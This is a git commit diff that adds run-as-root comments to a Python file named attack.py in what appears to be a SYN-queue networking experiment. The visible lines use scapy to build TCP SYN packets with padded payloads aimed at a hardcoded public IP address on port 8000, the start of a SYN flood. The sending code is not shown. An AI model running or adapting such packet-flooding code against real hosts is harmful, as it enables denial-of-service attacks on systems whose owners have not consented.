e99670a6303609816b237c6b76263a1b296f4fd4
Yisheng Gong <yisheng_gong@onmail.com>
2023-12-31 00:28:37 -0800

    add comment

--- network/syn_queue_case/attack.py
+++ network/syn_queue_case/attack.py
@@ -1,5 +1,8 @@
 from scapy.all import IP, TCP, send, Raw
 
+# make sure this script is
+# - run as root
+# - run on a linux machine
 ip = IP(dst="3.82.232.137")
 tcp = TCP(dport=8000, flags="S")
 body = Raw(b"X"*1024)
